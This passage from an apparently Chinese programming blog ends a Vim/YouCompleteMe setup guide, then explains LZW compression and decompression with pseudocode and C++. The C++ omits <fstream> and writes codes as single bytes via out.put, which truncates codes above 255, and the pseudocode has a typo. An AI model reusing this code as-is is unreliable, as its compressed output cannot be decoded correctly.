class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><br><span class="hljs-built_in">set</span> nocp<br><span class="hljs-built_in">set</span> modelines=0<br><span class="hljs-built_in">set</span> backspace=2<br>syntax on <br>autocmd InsertLeave * se nocul<br>autocmd InsertEnter * se cul<br><span class="hljs-built_in">set</span> smartindent <br><span class="hljs-built_in">set</span> autoindent<br><span class="hljs-built_in">set</span> confirm <br><span class="hljs-built_in">set</span> tabstop=4 <br><span class="hljs-built_in">set</span> softtabstop=4<br><span class="hljs-built_in">set</span> shiftwidth=4 <br><span class="hljs-built_in">set</span> expandtab <br><span class="hljs-built_in">set</span> number<br><span class="hljs-built_in">set</span> <span class="hljs-built_in">history</span>=50  <br><span class="hljs-built_in">set</span> hlsearch<br><span class="hljs-built_in">set</span> incsearch<br><span class="hljs-built_in">set</span> gdefault<br><span class="hljs-built_in">set</span> encoding=utf-8<br><span class="hljs-built_in">set</span> fileencodings=utf-8,ucs-bom,shift-jis,gb18030,gbk,gb2312,cp936,utf-16,big5,euc-jp,latin1<br><span class="hljs-built_in">set</span> guifont=Menlo:h16:cANSI <br><span class="hljs-built_in">set</span> langmenu=zn_CN.UTF-8<br><span class="hljs-built_in">set</span> helplang=cn <br><span class="hljs-built_in">set</span> ruler <br><span class="hljs-built_in">set</span> laststatus=1 <br><span class="hljs-built_in">set</span> showcmd <br><span class="hljs-built_in">set</span> scrolloff=3<br><span class="hljs-built_in">set</span> showmatch <br><span class="hljs-built_in">set</span> matchtime=5<br><span class="hljs-built_in">set</span> autowrite <br><span class="hljs-built_in">set</span> wildmenu  <br><span class="hljs-built_in">set</span> linespace=2 <br><span class="hljs-built_in">set</span> whichwrap=b,s,&lt;,&gt;,[,] <br><span class="hljs-built_in">set</span> foldenable  <br><span class="hljs-built_in">set</span> cursorline <br><span class="hljs-built_in">set</span> magic  <br><span class="hljs-built_in">set</span> ignorecase<br><span class="hljs-built_in">set</span> background=dark<br><span class="hljs-built_in">set</span> t_Co=256   <br><span class="hljs-built_in">set</span> mouse=i <br><span class="hljs-built_in">set</span> backspace=indent,eol,start<br><span class="hljs-built_in">set</span> nocompatible<br><br><span class="hljs-built_in">set</span> rtp+=~/.vim/bundle/Vundle.vim<br>call vundle<span class="hljs-comment">#begin()</span><br>Plugin <span class="hljs-string">&#x27;VundleVim/Vundle.vim&#x27;</span><br>Plugin <span class="hljs-string">&#x27;Valloric/YouCompleteMe&#x27;</span><br>Plugin <span class="hljs-string">&#x27;altercation/vim-colors-solarized&#x27;</span><br>Plugin <span class="hljs-string">&#x27;scrooloose/nerdtree&#x27;</span><br>Plugin <span class="hljs-string">&#x27;scrooloose/nerdcommenter&#x27;</span><br>Plugin <span class="hljs-string">&#x27;majutsushi/tagbar&#x27;</span><br>Plugin <span class="hljs-string">&#x27;whatyouhide/vim-gotham&#x27;</span><br>Plugin <span class="hljs-string">&#x27;vim-airline/vim-airline&#x27;</span><br>Plugin <span class="hljs-string">&#x27;vim-airline/vim-airline-themes&#x27;</span><br><br>call vundle<span class="hljs-comment">#end()</span><br><br>filetype plugin indent on<br><br>autocmd CursorMovedI,InsertLeave * <span class="hljs-keyword">if</span> pumvisible() == 0|silent! pclose|endif<br>autocmd InsertLeave * <span class="hljs-keyword">if</span> pumvisible() == 0|pclose|endif<br><span class="hljs-built_in">set</span> completeopt=longest,menu<br>highlight Pmenu    guibg=darkgrey  guifg=black<br>highlight PmenuSel guibg=lightgrey guifg=black<br>inoremap &lt;expr&gt; &lt;Down&gt;     pumvisible() ? <span class="hljs-string">&quot;\&lt;C-n&gt;&quot;</span> : <span class="hljs-string">&quot;\&lt;Down&gt;&quot;</span><br>inoremap &lt;expr&gt; &lt;Up&gt;       pumvisible() ? <span class="hljs-string">&quot;\&lt;C-p&gt;&quot;</span> : <span class="hljs-string">&quot;\&lt;Up&gt;&quot;</span><br>inoremap &lt;expr&gt; &lt;PageDown&gt; pumvisible() ? <span class="hljs-string">&quot;\&lt;PageDown&gt;\&lt;C-p&gt;\&lt;C-n&gt;&quot;</span> : <span class="hljs-string">&quot;\&lt;PageDown&gt;&quot;</span><br>inoremap &lt;expr&gt; &lt;PageUp&gt;   pumvisible() ? <span class="hljs-string">&quot;\&lt;PageUp&gt;\&lt;C-p&gt;\&lt;C-n&gt;&quot;</span> : <span class="hljs-string">&quot;\&lt;PageUp&gt;&quot;</span><br>inoremap &lt;expr&gt; &lt;CR&gt;       pumvisible() ? <span class="hljs-string">&quot;\&lt;C-y&gt;&quot;</span> : <span class="hljs-string">&quot;\&lt;CR&gt;&quot;</span><br><br><span class="hljs-built_in">let</span> g:ycm_key_list_select_completion = [<span class="hljs-string">&#x27;&lt;Down&gt;&#x27;</span>]<br><span class="hljs-built_in">let</span> g:ycm_key_list_previous_completion = [<span class="hljs-string">&#x27;&lt;Up&gt;&#x27;</span>]<br><br><span class="hljs-built_in">let</span> g:ycm_goto_buffer_command = <span class="hljs-string">&#x27;horizontal-split&#x27;</span><br><span class="hljs-built_in">let</span> g:ycm_server_python_interpreter=<span class="hljs-string">&#x27;/usr/bin/python2&#x27;</span><br><span class="hljs-built_in">let</span> g:ycm_global_ycm_extra_conf = <span class="hljs-string">&#x27;~/.vim/.ycm_extra_conf.py&#x27;</span><br><span class="hljs-built_in">let</span> g:airline<span class="hljs-comment">#extensions#tabline#enabled = 1</span><br><span class="hljs-built_in">let</span> g:ycm_seed_identifiers_with_syntax = 1<br><span class="hljs-built_in">let</span> g:ycm_complete_in_strings = 1<br><span class="hljs-built_in">let</span> g:ycm_collect_identifiers_from_tags_files = 1<br><span class="hljs-built_in">let</span> g:ycm_complete_in_comments = 1<br><span class="hljs-built_in">let</span> g:ycm_min_num_of_chars_for_completion = 2<br><span class="hljs-built_in">let</span> g:ycm_cache_omnifunc=0<br><span class="hljs-built_in">let</span> g:ycm_confirm_extra_conf=0<br><br><br>syntax <span class="hljs-built_in">enable</span><br><span class="hljs-string">&quot;colorscheme solarized</span><br><span class="hljs-string">&quot;</span>colorscheme gotham<br>colorscheme jellybeans<br><span class="hljs-built_in">let</span> g:solarized_termcolors=256<br><br><br><span class="hljs-built_in">let</span> g:NERDTreeDirArrowExpandable = <span class="hljs-string">&#x27;▸&#x27;</span><br><span class="hljs-built_in">let</span> g:NERDTreeDirArrowCollapsible = <span class="hljs-string">&#x27;▾&#x27;</span><br>map &lt;C-b&gt; :NERDTreeToggle&lt;CR&gt;<br><br><br>map &lt;C-m&gt; :Tagbar&lt;CR&gt;<br><span class="hljs-built_in">let</span> g:tagbar_ctags_bin=<span class="hljs-string">&#x27;ctags&#x27;</span><br><span class="hljs-built_in">let</span> g:tagbar_width=30<br><br></code></pre></div></td></tr></table></figure>
<p>之后只需在 vim 中  <strong>:PluginInstall</strong> 安装插件，可能需要点时间…</p>
<p>taglist是一个用于显示定位程序中各种符号的插件。这里我使用的是tagbar，它是一个taglist的替代品，要是有tagbar还需要生成 tags 文件，生成方法可以参考 <a href="https://www.vim.org/scripts/script.php?script_id=2358">https://www.vim.org/scripts/script.php?script_id=2358</a> 。</p>
<p>首先要从该网站下载  <code>cpp_src.tar.bz2</code> ，解压后是一个 cpp_src目录，然后执行一下命令</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">ctags -R --c++-kinds=+p --fields=+iaS --extra=+q --language-force=C++ cpp_src<br>mv tags ~/.vim<br></code></pre></div></td></tr></table></figure>
<p>而对于Vim颜色配置，比如本例中 jellybeans，则</p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">mkdir -p ~/.vim/colors<br><span class="hljs-built_in">cd</span> ~/.vim/colors<br>curl -O https://raw.githubusercontent.com/nanotech/jellybeans.vim/master/colors/jellybeans.vim<br>然后在 .vimrc 中设置 colorscheme jellybeans<br></code></pre></div></td></tr></table></figure>
<p>注意，如果 <code>let g:ycm_global_ycm_extra_conf = '~/.vim/.ycm_extra_conf.py'</code> 中 默认的 .ycm_extra_conf.py ，可能会出现一些莫名其妙的错误，那么可以下载该文件替换原有的 **.ycm_extra_conf.py **<br />
<a href="https://raw.githubusercontent.com/theodelrieu/dotfiles/master/.ycm_extra_conf.py">https://raw.githubusercontent.com/theodelrieu/dotfiles/master/.ycm_extra_conf.py</a></p>
<figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> ~/.vim/<br>curl -O  https://raw.githubusercontent.com/theodelrieu/dotfiles/master/.ycm_extra_conf.py<br></code></pre></div></td></tr></table></figure>
<h2 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h2>
<p>基本上YCM配置到此结束了，也没有想象中的那么难啦～<br />
现在vim支持Python和C/C++代码补全了<br />
最后贴一张测试图：</p>
<p><img src="/uploads/images/ycm_vim/ycm_vim.png" alt="YCM VIM" /></p>
<p>有啥问题可联系我哈~</p>
<p>bye</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Vim</tag>
        <tag>YCM</tag>
      </tags>
  </entry>
  <entry>
    <title>LZW文本压缩</title>
    <url>/lzw-cpp/</url>
    <content><![CDATA[<p>最近翻看《数据结构、算法与应用》里面关于哈希表章节时看到一个LZW文本压缩算法的实例，啃了很久才基本了解LZW算法，于是赶紧把它记录下来方便日后翻看。</p>
<span id="more"></span>
<h3 id="lzw"><a class="markdownIt-Anchor" href="#lzw"></a> LZW</h3>
<p>Lempel-Ziv-Welch（LZW）是由Abraham Lempel，Jacob Ziv和Terry Welch创建的<strong>无损</strong>数据压缩算法。<br />
为了减少一个文本文件占用的磁盘空间，通常需要将文本文件压缩编码后存储，这个过程需要对文件编码的<strong>压缩器compressor</strong>，以及解码的<strong>解压器decompressor</strong>。</p>
<h3 id="压缩compress"><a class="markdownIt-Anchor" href="#压缩compress"></a> 压缩compress</h3>
<p>LZW压缩方法是将文本字符串Text映射为数字编码Code（比如ASCII 0-255），而将文本字符串Text和数字编码Code这一对映射关系存储在字典/哈希表中。</p>
<p>首先我们规定：<code>p</code>表示存在于字典中<code>最长</code>的字符串，称为<strong>前缀字符串</strong>；<code>c</code>表示在待编码字符串<code>S</code>中匹配到的<code>p</code>前缀字符串的<code>下一个字符</code>，称为<strong>后缀字符</strong>；<code>p</code>在字典表<code>table</code>中的<code>代码</code>为<code>table[p]</code>。</p>
<p>为了简化事例，假设一串文本<code>S=aaabbbbbbaabaaba</code>只由a、b组成，初始情况下字典中只有<code>a</code>和<code>b</code>这两个字符，且存储在字典<code>table</code>中，已压缩串为空。</p>
<p>这张图参考了书上的例子，加上自己修改觉得挺不错的。图中表格阴影部分表示输出的压缩串代码在字典中的位置。<br />
<img src="/uploads/images/data_structure/lzw_cpp/01.png" alt="" /></p>
<p>用LZW压缩算法来模拟上图的过程：<br />
1.首先初始化字典<code>table&lt;String,Integer&gt;</code>；<br />
2.然后找到待编码字符串<code>S</code>的第一个字符作为<code>前缀字符串p</code>，且这个字符一定能在字典中找到对应代码<code>table[p]</code>；<br />
3.接着读取<code>S</code>的下一个<strong>字符</strong>作为<code>后缀字符c=a</code>；<br />
4.如果<code>p+c</code>在字典中，则p指向下一个字符串：<code>p=p+c</code>；<br />
5.如果<code>p+c</code>不在字典中，那么输出<code>p</code>在字典中的代码<code>table[p]</code>，同时为<code>p+c</code>在字典中分配一个新的代码<code>table[p+c]</code>，<code>p</code>指向下一个字符：<code>p=c</code>；<br />
6.重复步骤3、4、5直到<code>EOF</code>；<br />
7.最后输出代码<code>table[p]</code>；<br />
8.结束。</p>
<p>伪代码如下</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Initialize <span class="hljs-keyword">table</span><br>P = first <span class="hljs-keyword">input</span> <span class="hljs-type">character</span><br><span class="hljs-keyword">WHILE</span> <span class="hljs-keyword">not</span> EOF<br>    C = next <span class="hljs-keyword">input</span> <span class="hljs-type">character</span><br>    <span class="hljs-keyword">IF</span> P + C <span class="hljs-keyword">in</span> <span class="hljs-keyword">table</span><br>        P = P + C<br>    <span class="hljs-keyword">ELSE</span><br>        output the code <span class="hljs-keyword">for</span> P<br>        <span class="hljs-keyword">insert</span> P + C <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span><br>        P = C<br>output code <span class="hljs-keyword">for</span> P<br></code></pre></div></td></tr></table></figure>
<p>初始字典仅仅包含一些基本字符串和代码，但是随着编码的进行，字典不断扩增，如果遇到一个新的字符串<code>p+c</code>不在字典中，那么就将其添加到字典，以便下一次编码时<code>p+c</code>能够从字典中找到；如果能够在字典中找到<code>p+c</code>，意味着需要一个更长的字符串<code>p</code>来映射一些新的代码以达到文本压缩目的。就像上图例2,3，此时<code>p=a,c=a</code>,<code>&lt;aa,2&gt;</code>已经存在字典，下一次判断<code>p+c=aa</code>就能够在字典中找到<code>aa</code>，于是<code>p=p+c=aa</code>，尽可能选择一个最长的前缀字符串，接着下一次判断时<code>aa+b=aab</code>在字典中找不到，于是将<code>&lt;aab,3&gt;</code>插入到字典中。</p>
<p>还有当读取文件尾/字符串到达结尾时，此时<code>p</code>还保留之前的字符串<code>p=c</code>或<code>p=p+c</code>，而且一定能在字典中找到。这是因为单个字符<code>p=c</code>在初始字典table时就已经有对应的代码了，而<code>p=p+c</code>要成立，那么它必须是插入<code>p+c</code>之后才能得到，也就是说，“输出”慢于“插入”。于是编码结束时，还要将对<code>table[p]</code>处理(输出)才算是完整的LZW编码。</p>
<p>于是，压缩文本中并没有包含在编码过程中的生成的字典，而是通过编码的进行不断生成新的<code>&lt;新字符串前缀,新的代码&gt;</code>，而且注意到，将文本编码后的代码输出也只是<code>前缀字符串p</code>。</p>
<h3 id="解压缩decompress"><a class="markdownIt-Anchor" href="#解压缩decompress"></a> 解压缩decompress</h3>
<p>与压缩对应的便是解压缩，其实lzw解压缩与lzw压缩是互逆的，但要理解它是怎么处理的需要些功夫。<br />
在前面的压缩compress时，定义一个初始字典，且映射关系为&lt;文本串,代码&gt; =&gt; <code>table&lt;String,Integer&gt;</code>。同样，解压缩也需要一个字典：<code>table&lt;Integer,String&gt;</code>。<br />
由于解码的过程中，解码器得到的是一个代码数字int，那得考虑代码在不在字典内，以及对应的解码文本是什么。</p>
<p>首先需要规定：<code>p</code>表示当前读取到的待解码串<code>S</code>中某一个代码，其对应的文本为<code>text(p)</code>（或者<code>table[p]</code>如果存在的话）；<code>q</code>表示出现于<code>p</code>之前的代码，可称为<code>前缀代码</code>，而且该代码<code>q</code>一定存在字典里，其对应的文本为<code>text(q)</code>；<code>fc(p)</code>表示<code>text(p)</code>的第一个字符(first character)，可称为<code>后缀字符</code>。</p>
<p>还是以上面的例子来说明，存在已经编码的代码串<code>0214537</code>。图中表格阴影部分表示将新的&lt;代码,文本&gt;添加到字典中。<br />
<img src="/uploads/images/data_structure/lzw_cpp/02.png" alt="" /></p>
<p>LZW解码过程如下：<br />
1.首先初始化字典；<br />
2.然后找到<code>S</code>的第一个代码<code>q</code>，而且该代码一定存在字典内（这是由编码时决定的），输出文本<code>text(q)</code>；<br />
3.接着读取<code>S</code>的下一个代码<code>p</code>；<br />
4.如果<code>p</code>在字典里，则输出对应的文本<code>text(p)</code>，同时向字典添加新的代码<code>text(q)fc(p)</code>；<br />
5.如果<code>p</code>不在字典里，则向字典添加新的代码<code>text(p)=text(q)fc(q)</code>，输出对应的文本<code>text(p)</code>；<br />
6.重复步骤3、4、5，直到<code>EOF</code>；<br />
7.结束。</p>
<p>伪代码如下：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">Initialize <span class="hljs-keyword">table</span><br>Q = first <span class="hljs-keyword">input</span> code<br>output <span class="hljs-keyword">table</span>[Q]<br><span class="hljs-keyword">WHILE</span> <span class="hljs-keyword">not</span> EOF<br>    P = next <span class="hljs-keyword">input</span> code<br>    <span class="hljs-keyword">IF</span> P <span class="hljs-type">int</span> <span class="hljs-keyword">table</span><br>        <span class="hljs-keyword">insert</span> TEXT(Q)+FirstCharacter(P) <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span><br>    <span class="hljs-keyword">ELSE</span><br>        <span class="hljs-keyword">insert</span> TEXT(Q)+FirstCharacter(Q) <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span><br>    output <span class="hljs-keyword">table</span>[P]<br>    Q=P<br></code></pre></div></td></tr></table></figure>
<p>1.<code>p</code>在字典里<br />
以代码<code>p=1</code>和代码<code>q=2</code>为例。<br />
现在根据<code>解压缩</code>的情况来分析：已知代码<code>p</code>在字典里，说明在<code>编码</code>过程（此时p表示代码对应的文本）中输出代码<code>table[p]=1</code>之前的某一步骤输出了代码<code>table[q]=2</code>，同时添加新的文本<code>q+c=aa+b=aab</code>到字典里且<code>table[q+c]=3</code>（<font color="red">这也就是解码时的text(q)+fc§，c=fc§</font>），然后<code>q=c=b</code>；之后继续判断<code>q+c=b+b=bb</code>不在字典内，则输出<code>table[q=b]=1</code>。于是就形成了代码<code>2 1</code>的情况。<br />
<img src="/uploads/images/data_structure/lzw_cpp/04.png" alt="" /></p>
<p>还有<code>5 3</code>这种情况<br />
<img src="/uploads/images/data_structure/lzw_cpp/03.png" alt="" /></p>
<p>2.<code>p</code>不在字典里<br />
这种情况只有在文本段中形式为<code>text(q)text(q)fc(q)</code>和<code>text(q)fc(q)</code>，且相应的压缩代码串为<code>qp</code>的时候（qp相邻，观察上图可知），只有在<code>q</code>被<code>text(q)</code>代替的情况下，代码<code>q</code>在字典中才不会有对应的文本，而这个文本应该是<code>text(q)fc(q)</code>。比如上面的<code>q=3 p=7</code>且原始文本段<code>aab aaba</code>，即<code>text(7)=text(3)fc(3)</code>；又如<code>q=4 p=5</code>且原始文本段<code>bb bbb</code>，即<code>text(5)=text(4)fc(4)</code>；而<code>q=5 p=3</code>的原始文本段为<code>bbb aab</code>，但是没有<code>text(3)=text(5)fc(5)=bbbb</code>这种情况。这是在编码过程中决定的。</p>
<p>解码是根据读取的代码来构建一个与编码之前完全相同的字典并输出对应的文本，而且也一定会将所有的代码读取完。</p>
<p>以上例子只展示了一个字符串只有a、b两个字符，以及初始字典为&lt;a,0&gt;、&lt;b,1&gt;，一般来说，常见文本文件是ASCII文件，所以这时的初始字典大小可以是256，包含了扩展ASCII码。</p>
<h3 id="code"><a class="markdownIt-Anchor" href="#code"></a> Code</h3>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;unordered_map&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span><span class="hljs-meta-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">constexpr</span> <span class="hljs-keyword">int</span> ALPHA_MAX=<span class="hljs-number">256</span>;<br>unordered_map&lt;string,<span class="hljs-keyword">int</span>&gt;table;<br>unordered_map&lt;<span class="hljs-keyword">int</span>,string&gt;table2;<br><br><span class="hljs-comment">// 保存编码之后的代码</span><br>vector&lt;<span class="hljs-keyword">int</span>&gt;codes;<br><span class="hljs-comment">// 保存解码之后的文本</span><br>string text;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(string str)</span></span>&#123;<br>    codes.<span class="hljs-built_in">push_back</span>(table[str]);<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">output</span><span class="hljs-params">(<span class="hljs-keyword">int</span> code)</span></span>&#123;<br>    text+=table2[code];<br>&#125;<br><span class="hljs-comment">// 编码</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">compress</span><span class="hljs-params">(string source)</span></span>&#123;<br>    <span class="hljs-comment">// 初始化字典</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ALPHA_MAX; i++)&#123;<br>        <span class="hljs-function">string <span class="hljs-title">key</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-keyword">char</span>(i))</span></span>;<br>        table.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(key,i));<br>    &#125;<br>    <span class="hljs-comment">// 已使用代码数量</span><br>    <span class="hljs-keyword">int</span> usedCode=ALPHA_MAX;<br>    string p=<span class="hljs-string">&quot;&quot;</span>;<br>    string c;<br>    p+=source[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">int</span> len=source.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len; i++) &#123;<br>        c.<span class="hljs-built_in">clear</span>();<br>        c+=source[i];<br>        <span class="hljs-comment">// p+c在字典</span><br>        <span class="hljs-keyword">if</span>(table.<span class="hljs-built_in">find</span>(p+c)!=table.<span class="hljs-built_in">end</span>())&#123;<br>            p=p+c;<br>        <span class="hljs-comment">// p+c不在字典</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">output</span>(p);<br>            table.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(p+c,usedCode++));<br>            p=c;<br>        &#125;<br>    &#125;<br>    <span class="hljs-built_in">output</span>(p);<br>&#125;<br><span class="hljs-comment">// 解码</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">uncompress</span><span class="hljs-params">(vector&lt;<span class="hljs-keyword">int</span>&gt;codes)</span></span>&#123;<br>    <span class="hljs-comment">// 初始化字典</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; ALPHA_MAX; i++)&#123;<br>        <span class="hljs-function">string <span class="hljs-title">text</span><span class="hljs-params">(<span class="hljs-number">1</span>,<span class="hljs-keyword">char</span>(i))</span></span>;<br>        table2.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(i,text));<br>    &#125;<br>    <span class="hljs-comment">// 已使用代码数量</span><br>    <span class="hljs-keyword">int</span> usedCode=ALPHA_MAX;<br><br>    <span class="hljs-keyword">int</span> q=codes[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">output</span>(q);<br>    <span class="hljs-keyword">int</span> len=codes.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; len; i++)&#123;<br>        <span class="hljs-comment">// 读取下一个代码code</span><br>        <span class="hljs-keyword">int</span> p=codes[i];<br>        <span class="hljs-comment">// 当前读取的代码p在字典</span><br>        <span class="hljs-keyword">if</span>(table2.<span class="hljs-built_in">find</span>(p)!=table2.<span class="hljs-built_in">end</span>())&#123;<br>            <span class="hljs-comment">// text(code)=text(q)fc(p)</span><br>            string code=table2[q]+table2[p][<span class="hljs-number">0</span>];<br>            table2.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(usedCode++,code));<br>        <span class="hljs-comment">// 当前读取的代码p不在字典</span><br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">// text(p)=text(q)fc(q)</span><br>            string pT=table2[q]+table2[q][<span class="hljs-number">0</span>];<br>            table2.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(usedCode++,pT));<br>        &#125;<br>        q=p;<br>        <span class="hljs-built_in">output</span>(p);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    ifstream in;<br>    in.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,ios_base::binary);<br>    string text=<span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">char</span> c;<br>    <span class="hljs-keyword">while</span>((c=in.<span class="hljs-built_in">get</span>())!=EOF)&#123;<br>        text+=c;<br>    &#125;<br>    <span class="hljs-built_in">compress</span>(text);<br>    in.<span class="hljs-built_in">close</span>();<br><br>    ofstream out;<br>    out.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;test.txt.lzw&quot;</span>,ios_base::binary);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> x:codes)&#123;<br>        out.<span class="hljs-built_in">put</span>(x);<br>    &#125;<br>    out.<span class="hljs-built_in">close</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>
<p>测试一个ASCII文件<br />
<img src="/uploads/images/data_structure/lzw_cpp/05.png" alt="" /></p>
